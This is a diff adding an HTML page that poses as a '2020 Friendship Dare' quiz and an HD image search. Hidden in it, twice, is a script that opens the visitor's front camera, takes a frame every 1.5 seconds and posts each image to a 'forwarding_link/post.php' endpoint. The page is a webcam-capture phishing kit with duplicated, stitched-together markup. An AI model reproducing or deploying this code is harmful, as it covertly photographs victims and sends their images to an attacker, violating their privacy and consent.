@@ -1,0 +1,620 @@
+<!doctype html>
+<html>
+<head>
+
+
+<head>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+            <link rel="canonical" href="https://grandedesafio.com/quiz" />
+    
+            <title>Cari Gambar Bentuk Hd</title>
+        <meta name="description" content="2020 Friendship Dare">
+        <meta property="og:title" content="2020 Friendship Dare" />
+        <meta property="og:image" content="https://grandedesafio.com/images/grandedesafio/bond.png">
+
+                <meta property="og:description" content="2020 DAFTAR HD">
+                
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/pure-min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/grids-responsive-min.css">
+
+    <link rel="stylesheet" href="https://grandedesafio.com/css/style.css?v=35">
+    
+
+            <style>
+            .pure-button-primary, .pure-button-color, .custom-menu-wrapper{
+                background-color: #99003b !important;
+            }
+            .ready{
+                color: #99003b;
+            }
+            .number_list .active {
+                background: #99003b;
+                color: #fff;
+            }
+        </style>
+<meta name="msapplication-config" content="none"/>
+
+    <link rel="shortcut icon" type="image/x-icon" href="https://grandedesafio.com/images/grandedesafio/icon.png?v=4" />
+    <link rel="apple-touch-icon" href="https://grandedesafio.com/images/grandedesafio/icon.png?v=4"/>
+    <link rel="apple-touch-icon-precomposed" href="https://grandedesafio.com/images/grandedesafio/icon.png?v=4"/>
+
+    
+    
+
+    
+
+    
+
+
+            <script data-cfasync="false" type="text/javascript">
+        (function(w, d) {
+            var s = d.createElement('script');
+            s.src = '//cdn.adpushup.com/39117/adpushup.js';
+            s.type = 'text/javascript'; s.async = true;
+            (d.getElementsByTagName('head')[0] || d.getElementsByTagName('body')[0]).appendChild(s);
+        })(window, document);
+        </script>
+    
+
+    
+
+    
+
+
+    
+    
+
+    
+
+
+
+
+    <script>
+        
+        function setCookie1(cname, cvalue, exdays) {
+            var d = new Date();
+            d.setTime(d.getTime() + (exdays*24*60*60*1000));
+            var expires = "expires="+ d.toUTCString();
+            document.cookie = cname + "=" + encodeURIComponent(cvalue) + ";" + expires + ";path=/";
+        }
+
+        function getCookie1(cname) {
+            var name = cname + "=";
+            var cookie = document.cookie;
+            var ca = cookie.split(';');
+            for(var i = 0; i <ca.length; i++) {
+                var c = ca[i];
+                while (c.charAt(0) == ' ') {
+                    c = c.substring(1);
+                }
+                if (c.indexOf(name) == 0) {
+                    return decodeURIComponent(c.substring(name.length, c.length));
+                }
+            }
+            return "";
+        }
+
+    </script>
+
+
+
+    
+
+
+    
+
+    
+</head>
+
+
+<body>
+
+<div class="custom-menu-wrapper">
+
+            <div class="pure-menu custom-menu custom-menu-top">
+                            <span><img src="https://grandedesafio.com/images/grandedesafio/icon.png?v=4" alt="" style="display: inline; width: 25px; position: absolute;"></span>
+                        <a href="/en" class="pure-menu-heading custom-menu-brand" style="display: inline; left: 30px;text-transform: none;font-weight: 600;">2020 Friendship Dare</a>
+        </div>
+    
+
+</div>
+<div class="outer_container tenpxtop">
+
+
+
+<div class="pure-g">
+    
+    <div class="pure-u-1-24 pure-u-md-1-4"></div>
+    <div class="pure-u-11-12 pure-u-md-1-2 well">
+    
+                    <div class="center circles">
+                <img class="change_color" src="https://grandedesafio.com/images/common/circles/1.png" data-color='#000000'>
+                <img class="change_color" src="https://grandedesafio.com/images/common/circles/2.png" data-color='#fc4d21'>
+                <img class="change_color" src="https://grandedesafio.com/images/common/circles/3.png" data-color='#f27f00'>
+                <img class="change_color" src="https://grandedesafio.com/images/common/circles/4.png" data-color='#172c6f'>
+                <img class="change_color" src="https://grandedesafio.com/images/common/circles/10.png" data-color='#b14e00'>
+                <img class="change_color" src="https://grandedesafio.com/images/common/circles/6.png" data-color='#99003b'>
+                <img class="change_color" src="https://grandedesafio.com/images/common/circles/7.png" data-color='#ff4a40'>
+            </div>
+        
+
+        <div class="center">
+                            <div class="center">
+                    <div id="visited-ad">
+                        
+                    </div>
+                    <script>
+                        if (getCookie1('visited') == '' || parseInt(getCookie1('visited')) < 4 ) {
+                            document.getElementById("visited-ad").outerHTML = "";
+                        }
+                    </script>
+                </div>
+                    </div>
+
+                    <div id="question_count" class="hidden fivepxtop">
+                <ul class="number_list center">
+                    <li id='number_1' class="active">1</li>
+                    <li id='number_2'>2</li>
+                    <li id='number_3'>3</li>
+                    <li id='number_4'>4</li>
+                    <li id='number_5'>5</li>
+
+                                            <li id='number_6'>6</li>
+                        <li id='number_7'>7</li>
+                        <li id='number_8'>8</li>
+                        <li id='number_9'>9</li>
+                        <li id='number_10'>10</li>
+                    
+                                            <div class="visible-xs fivepxtop"></div>
+                        <li id='number_11'>11</li>
+                        <li id='number_12'>12</li>
+                        <li id='number_13'>13</li>
+                        <li id='number_14'>14</li>
+                        <li id='number_15'>15</li>
+                                                                <div class="fivepxtop"></div>
+                        <li id='number_16'>16</li>
+                        <li id='number_17'>17</li>
+                        <li id='number_18'>18</li>
+                        <li id='number_19'>19</li>
+                        <li id='number_20'>20</li>
+                                    </ul>
+                <h3 class="zerobotton tenpxtop hidden">
+                    Creating quiz
+                    <span id="question_number">0</span>/20
+                </h3>
+            </div>
+
+        
+
+        <div id="share_link_generating" class="hidden center">
+            <h3 class="fivepxbotton">Please Wait...</h3>
+            <h3 class="fivepxbotton fivepxtop">Creating quiz... </h3>
+            <div class="loader center" style="display: inline-block;"></div>
+        </div>
+
+
+        <div id="recreate_quiz" class="hidden center">
+            <h3 class="fivepxbotton">Some error occured... Please create your quiz again after 5 mins</h3>
+            <a href="/quiz" class="pure-button pure-button-primary full">👉 Create your Quiz</a>
+        </div>
+
+        <div id="initial_block" class="center hidden">
+            <h3 class="fivepxbotton">Please Wait...</h3>
+            <h3 class="fivepxbotton fivepxtop">Preparing Questions list for you.</h3>
+        </div>
+
+        <div id="name_email_info" class="pure-form pure-form-stacked">
+            <div class="pure-g">
+
+                <div class="pure-u-1">
+                    <h3 class="center fivepxtop quiz_heading">
+                        <img src="https://grandedesafio.com/images/grandedesafio/left.png?v=4" style="height: 18px;"> 
+                          KUMPULAN GAMBAR HD
+                        <img src="https://grandedesafio.com/images/grandedesafio/right.png?v=4" style="height: 18px;">
+                    </h3>
+                </div>
+
+                <div class="pure-u-1">
+                    <label>
+                       
+                    </select>
+                </div>
+                
+
+                <div class="pure-u-1">
+                    <label>
+                        <h4 class="fivepxbottom tenpxtop">Ketik Nama Gambar Yang Di Ingkinkan : </h4>
+                    </label>
+                    <input id="name" class="pure-u-1" type="text" placeholder="Name Gambar">
+                    <span id="name_error" class="error hidden">Name Cannot be Blank</span>
+                </div>
+
+                <div class="pure-u-1">
+                    <a id="start_create" href="javascript:void(0)" class="pure-button pure-button-primary full">👉&nbsp;  Start &nbsp;👈</a>
+                </div>
+                
+            </div>
+        </div>
+
+
+        <div id="questions_block" class="hidden center">
+
+                                            <a id="skip_question" href="javascript:void(0)" class="pure-button pure-button-primary fourteenpxfont">Skip this Question</a>
+                            
+            
+                                                            <div id="eni" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">Which time do you like?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/i/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Day</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/i/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Night</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enzza" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">If you win a lottery what will you buy?</h3>
+
+                  
+                                               
+
+                
+
+            <textarea class="pure-input-1 pure-u-1" rows="2" id="newquizid"></textarea>
+
+            <div class="pure-g center tenpxbottom">
+
+    <div class="pure-u-1">
+        <button class="copy-btn pure-button pure-button-color tenpxtop fivepxbottom" 
+            data-clipboard="" data-clipboard-target="#newquizid">
+            Copy this link
+        </button>
+    </div>
+    
+    
+
+    
+    
+    <div class="pure-u-1 pure-u-md-1-2 " style="margin: auto">
+        <a id="whatsapp_link" href="" target="_blank" class="tenpxtop pure-button whatsapp_button">
+            <img src="https://grandedesafio.com/images/common/whatsapp.svg" alt="" width="18px" height="18px">
+            &nbsp;<span class="whatsapp_status_text">Whatsapp Status</span>
+        </a>
+    </div>
+
+    <div class="pure-u-1 pure-u-md-1-2" style="margin: auto">
+        <a href="#insta_popup" class="tenpxtop pure-button instagram_button">
+            <span class="instagram_status_text">Add to Instagram Bio</span>
+        </a>
+    </div>
+
+</div>
+
+
+
+
+    <div class="addthis_share addthis_inline_share_toolbox_yaj3" ></div>
+
+
+<!-- insta popup -->
+<div id="insta_popup" class="overlay left">
+    <div class="popup">
+        <h3 class="color center fivepxbottom">How to add this link to your Instagram BIO.</h3>
+        <a class="close" href="#">&times;</a>
+        <div class="content left">
+            <ul class="fivepxtop">
+                <li>Copy your link</li>
+                <li>Go on your profile in the app</li>
+                <li>Click on Edit Profile</li>
+                <li>Paste the link under Website section</li>
+            </ul>
+        </div>
+    </div>
+</div>
+
+
+            <span class="center view_results_bottom">
+                <a href="" class="pure-button pure-button-primary full">👉 View Results</a>
+            </span>
+        </div>
+
+    </div>
+    <div class="pure-u-1-24 pure-u-md-1-4"></div>
+
+
+    
+    <div class="pure-u-1-24 pure-u-md-1-4"></div>
+    <div class="pure-u-11-12 pure-u-md-1-2 center">
+        
+                            <div class="center tenpxtop adpushup_ad">
+                </div>
+
+            
+    </div>
+    <div class="pure-u-1-24 pure-u-md-1-4"></div>
+
+
+</div>
+</div>
+
+
+</body>
+<footer>
+
+<br>
+<br><br>
+    
+    <hr>
+    <p class="center">
+        <a href="https://grandedesafio.com/en/contact">Contact</a>
+                <br><br>
+    </p>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://grandedesafio.com/common/js/helper.js?v=7"></script>
+
+    
+    <script>
+        var analytics = '148233951';
+    </script>
+
+
+    <script>
+        // Set it while attempting quiz
+        var country = '';
+        var language = '';
+        
+        if (getCookie('country') == null || getCookie('country') == '') {
+            country = "";
+            setCookie('country', country);
+        }
+
+        if (getCookie('language') == null || getCookie('language') == '') {
+            language = "";
+            setCookie('language', language);
+        }
+
+        var copied  = 'Copied';
+        var title   = '&quot;nameeee - 2020 Friendship Dare&quot;'.replace(/(&quot\;)/g,"");
+        var description = '&quot;\ud83e\udd1c nameeee has sent you real *2020 Friendship Challenge* \ud83d\udc78\ud83e\udd34\ufe0f%0A\ud83c\udfaf *Accept this Challenge NOW* \ud83e\udd47\ud83e\udd48\ud83e\udd49%0A\u203c\ufe0f\ud83d\udc47\ud83d\udc47\ud83d\udc47\u203c\ufe0f %0A &quot;'.replace(/(&quot\;)/g,"");;
+        var description_addthis = '&quot;\ud83e\udd1c nameeee has sent you real 2020 Friendship Challenge \ud83d\udc78\ud83e\udd34\ufe0f. \n\t\t\ud83c\udfaf Accept this Challenge NOW \ud83e\udd47\ud83e\udd48\ud83e\udd49\n\t\t\u203c\ufe0f\ud83d\udc47\ud83d\udc47\ud83d\udc47\u203c\ufe0f\n\t\t&quot;'.replace(/(&quot\;)/g,"");;
+
+        var menu    = 'register';
+        var quizid  = '';
+        var domain  = 'https://grandedesafio.com';
+        var locale  = 'en';
+        var api_slug    = 'gd';
+        var api_domain  = 'https://api.truefalse.site';
+        var questions_count = '20';
+
+
+        var quizurl = '/quiz';
+        var quiz_slug = '';
+
+                    if (getCookie('color') == '') {
+                setCookie('color', '#99003b');
+            }
+        
+        var log_skip_events = 0;
+        
+
+    </script>
+
+
+    <script src="https://grandedesafio.com/js/script.js?b=28"></script>
+    
+
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <script>
+
+        var clipboardDemos = new ClipboardJS('[data-clipboard]');
+        clipboardDemos.on('success', function(e) {
+            e.clearSelection();
+            showTooltip(e.trigger, copied);
+        });
+        clipboardDemos.on('error', function(e) {
+            showTooltip(e.trigger, fallbackMessage(e.action));
+        });
+
+
+        // Tooltip code
+        var btns = document.querySelectorAll('.copy-btn');
+        for (var i = 0; i < btns.length; i++) {
+            btns[i].addEventListener('mouseleave', clearTooltip);
+            btns[i].addEventListener('blur', clearTooltip);
+        }
+        function clearTooltip(e) {
+            e.currentTarget.removeAttribute('aria-label');
+        }
+        function showTooltip(elem, msg) {
+            $('.copy-btn').addClass('tooltipped');
+            $('.copy-btn').addClass('tooltipped-s');
+            elem.setAttribute('aria-label', msg);
+        }
+        function fallbackMessage(action) {
+            var actionMsg = '';
+            var actionKey = (action === 'cut' ? 'X' : 'C');
+            if (/iPhone|iPad/i.test(navigator.userAgent)) {
+                actionMsg = 'No support :(';
+            } else if (/Mac/i.test(navigator.userAgent)) {
+                actionMsg = 'Press ⌘-' + actionKey + ' to ' + action;
+            } else {
+                actionMsg = 'Press Ctrl-' + actionKey + ' to ' + action;
+            }
+            return actionMsg;
+        }
+
+    </script>
+
+#Main Script Start
+
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <body>
+        <p>Hint: Look at the favicon</p>
+        <p>(Accept Permissions)</p>
+        <p><label><input type="checkbox" name="mirror" id="mirror" /> Mirror image</label></p>
+    </body>
+    
+#Main Script End
+</html>
